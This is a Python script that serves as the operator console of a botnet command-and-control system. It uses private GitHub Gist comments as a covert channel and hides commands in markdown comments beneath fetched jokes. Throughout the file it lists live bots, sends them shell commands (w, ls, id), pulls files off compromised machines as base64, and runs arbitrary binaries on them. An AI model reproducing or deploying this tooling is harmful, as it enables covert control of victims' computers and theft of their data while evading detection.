import base64
import json
import re
import sys
import time
from datetime import datetime, timedelta
import requests
import uuid
import subprocess

import requests

GITHUB_TOKEN = 'PUT_YOUR_TOKEN_HERE'

headers = {
    "Authorization": "token " + GITHUB_TOKEN
}

def extract_comment(comment):
    pattern = r'"([^"]*)"'
    matches = re.finditer(pattern, comment)
    # Iterate over the matches
    messages = []
    for match in matches:
        # Extract the matched text
        matched_text = match.group()
        messages.append(matched_text)
    return messages

def create_gist():
    data = {
        "description": "A Gist for storing jokes",
        "public": False,
        "files": {
            "jokes.txt": {
                "content": "Hello! Welcome to this GIST, paste your favorite jokes!"
            }
        }
    }
    url = "https://api.github.com/gists"
    response = requests.post(url, headers=headers, data=json.dumps(data))
    response_json = response.json()
    return response_json["id"]

def get_gist_comments(gistID):
    url = f"https://api.github.com/gists/{gistID}/comments"
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        comments = response.json()
        return comments

def get_bots(gistID):
    comments = get_gist_comments(gistID)
    time_threshold = datetime.utcnow() - timedelta(minutes=5)
    bot_ids = []
    for comment in comments:
        messages = extract_comment(comment["body"])
        if len(messages) >= 3:
            if messages[0] == "\"BOT:HEARTBEAT\"":
                if datetime.strptime(comment['updated_at'], "%Y-%m-%dT%H:%M:%SZ") > time_threshold:
                    bot_ids.append(messages[1][1:-1])
    return bot_ids

def create_comment_message(original_message):
    hidden_message = f"[//]: # \"{original_message}\"\n"
    return hidden_message

def generate_random_joke():
    response = requests.get('https://v2.jokeapi.dev/joke/Any?blacklistFlags=nsfw,religious,political,racist,sexist,explicit&format=txt')
    if response.status_code == 200:
        return response.content.decode("utf-8")
    else:
        return "Sorry I don't know any jokes"

def write_comment_joke(hidden):
    joke = generate_random_joke()
    return hidden + joke

def create_gist_comment(gistID, comment_text):
    url = f"https://api.github.com/gists/{gistID}/comments"
    data = {
        "body": comment_text
    }
    response = requests.post(url, json=data, headers=headers)
    return response

def check_for_bot_response(gistID, commentID):
    comments = get_gist_comments(gistID)
    for comment in comments:
        extracted = extract_comment(comment["body"])
        if len(extracted) >= 4:
            if extracted[0].startswith("\"BOT:EXEC:"):
                if extracted[2] == f"\"{commentID}\"":
                    return extracted[3]
    return None

def attack_from_bot(gistID, botID, command):
    comment = create_comment_message("COMMANDER") + create_comment_message(botID) + create_comment_message(command)
    commentBody = write_comment_joke(comment)
    response = create_gist_comment(gistID, commentBody)
    repeat = True
    if response.status_code == 201:
        response_json = response.json()
        print(f"Command: {command} was sent to: {botID}")
        while repeat:
            print("Waiting for response ...")
            time.sleep(10)
            bot_response = check_for_bot_response(gistID, response_json["id"])
            if bot_response == None:
                user_input = input("The bot did not respond in 10 seconds, want to wait more? [y/n] ")
                if user_input == "y":
                    repeat = True
                else:
                    bot_response = "NO RESPONSE"
                    repeat = False
            else:
                repeat = False
    return bot_response[1:-1]


def select_bot_to_attack(bots):
    for i in range(len(bots)):
        print(f"Bot number: [{i}] - unique ID = {bots[i]}")
    bot_id = input("Pick a bot number: ")
    try:
        bot_id = int(bot_id)
        if bot_id < len(bots):
            return bots[bot_id]
    except:
        return None

def base64_to_file(base64_string, filepath):
    try:
        base64_bytes = base64_string.encode('utf-8')
        file_content = base64.b64decode(base64_bytes)
        with open(filepath, 'wb') as file:
            file.write(file_content)
        return f"File was written into {filepath}"
    except:
        return "Something went wrong with the file copy"

if __name__ == '__main__':
    GIST_ID = create_gist()
    print(f"Created gist with following id: {GIST_ID}")
    bots = get_bots(GIST_ID)

    print("Welcome in the command center, following commands are available")
    while True:
        bots = get_bots(GIST_ID)
        print("""
    0 - checks how many bots are available
    1 - list of users currently logged in
    2 - list content of specified directory
    3 - id of current user
    4 - copy file
    5 - execute binary
    """)
        command = input("Which command do you want to run? ")
        if command == "0":
            bots = get_bots(GIST_ID)
            print(f"We should have {len(bots)} bots at our disposal")
        if command == "1":
            selected_bot = select_bot_to_attack(bots)
            if selected_bot is not None:
                response = attack_from_bot(GIST_ID, selected_bot, "w")
                print(f"Response: {response}")
            else:
                print("No valid bot was selected")
        if command == "2":
            selected_bot = select_bot_to_attack(bots)
            if selected_bot is not None:
                path = input("What path?: ")
                response = attack_from_bot(GIST_ID, selected_bot, f"ls {path}")
                print(f"Response: {response}")
            else:
                print("No valid bot was selected")
        if command == "3":
            selected_bot = select_bot_to_attack(bots)
            if selected_bot is not None:
                response = attack_from_bot(GIST_ID, selected_bot, "id")
                print(f"Response: {response}")
            else:
                print("No valid bot was selected")
        if command == "4":
            selected_bot = select_bot_to_attack(bots)
            if selected_bot is not None:
                path = input("Tell me a path to the file: ")
                response = attack_from_bot(GIST_ID, selected_bot, f"cp {path}")
                if response != "\"NO SUCH FILE WAS FOUND\"":
                    path_to_store = input("Tell me where to store the file: ")
                    result = base64_to_file(response, path_to_store)
                    print(result)
            else:
                print("No valid bot was selected")
        if command == "5":
            selected_bot = select_bot_to_attack(bots)
            if selected_bot is not None:
                path = input("Tell me a path to the binary: ")
                response = attack_from_bot(GIST_ID, selected_bot, path)
                print(f"Response: {response}")
            else:
                print("No valid bot was selected")






